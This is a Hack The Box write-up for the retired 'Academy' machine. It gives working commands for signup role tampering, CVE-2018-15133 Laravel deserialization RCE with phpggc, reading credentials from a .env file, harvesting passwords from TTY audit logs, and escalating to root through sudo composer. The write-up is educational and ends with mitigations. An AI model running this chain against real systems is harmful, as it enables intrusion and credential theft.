---
machine: Academy
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, web, laravel, deserialization, cve-2018-15133, vhost, sudo]
---

# Academy — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

Registration accepts a hidden `roleid`: change it and you get the admin panel, which reveals the `dev-staging-01.academy.htb` vhost. That environment runs Laravel with `APP_DEBUG=true` and leaks the `APP_KEY`; with it, **CVE-2018-15133** deserialization gives RCE. Another app's `.env` leaks a password that works for `cry0l1t3`, who is in `adm`; the TTY audit logs (`aureport --tty`) reveal `mrb3n`'s password, and `mrb3n` is the account with `sudo` on `composer`.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp    open  ssh      OpenSSH 8.2p1
80/tcp    open  http     Apache httpd 2.4.41
33060/tcp open  mysqlx   MySQL X protocol
```

```bash
echo "<IP> academy.htb" >> /etc/hosts
gobuster dir -u http://academy.htb -w /usr/share/wordlists/dirb/common.txt -x php
```

The site mimics the HTB Academy platform: registration, login and an admin area at `admin.php`.

## Access

1. **Role tampering on signup**: intercept `POST /register.php` and add or change the hidden `roleid=1` field. The account becomes admin and `admin.php` shows a panel naming a development subdomain.

2. **Laravel vhost in debug mode**:

```bash
echo "<IP> dev-staging-01.academy.htb" >> /etc/hosts
curl -s http://dev-staging-01.academy.htb/ | grep -i -E 'APP_KEY|DB_'
```

The error trace dumps environment variables: `APP_KEY`, `DB_USERNAME`, `DB_PASSWORD`.

3. **CVE-2018-15133** (cookie deserialization in Laravel with a known `APP_KEY`):

```bash
php -d 'phar.readonly=0' ./phpggc -o /tmp/payload Laravel/RCE9 system 'id' --fast-destruct
python3 laravel_exploit.py http://dev-staging-01.academy.htb/ <APP_KEY> --interactive
```

```text
www-data@academy:/var/www/html/htb-academy-dev-01/public$
```

4. **Web to user**: `/var/www/html/htb-academy-dev-01/.env` holds database credentials, and the password is reused by `cry0l1t3` (member of `adm`):

```bash
cat /var/www/html/htb-academy-dev-01/.env
ssh cry0l1t3@<IP>
```

## Escalation

`cry0l1t3` is in `adm`, so `aureport --tty` exposes `mrb3n`'s keystrokes and password; `mrb3n` is the account with this rule:

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/composer
```

`composer` runs package scripts; with a local `composer.json` you get a command as root:

```bash
mkdir -p /tmp/p && cd /tmp/p
cat > composer.json <<'EOF'
{"scripts":{"x":"id"},"config":{"preferred-install":"dist"}}
EOF
sudo composer run-script x
```

```text
uid=0(root) gid=0(root)
```

## Pitfalls

- The field may be called `roleid`, `role` or `is_admin`; compare a normal registration with an admin one.
- The vhost does not resolve without the `/etc/hosts` entry.
- `phpggc` needs `phar.readonly=0`; otherwise the payload comes out empty.
- The `.env` password is not always `cry0l1t3`'s: try the MySQL one (`homestead`) too.

## Lessons

- A role parameter accepted from the client is a direct privilege escalation.
- `APP_DEBUG=true` in production leaks keys that enable deserialization RCE.
- `composer` under `sudo` equals root: any tool that runs scripts does.
- Mitigation: assign roles server-side, disable debug outside development, and restrict `sudo` to concrete commands rather than script runners.
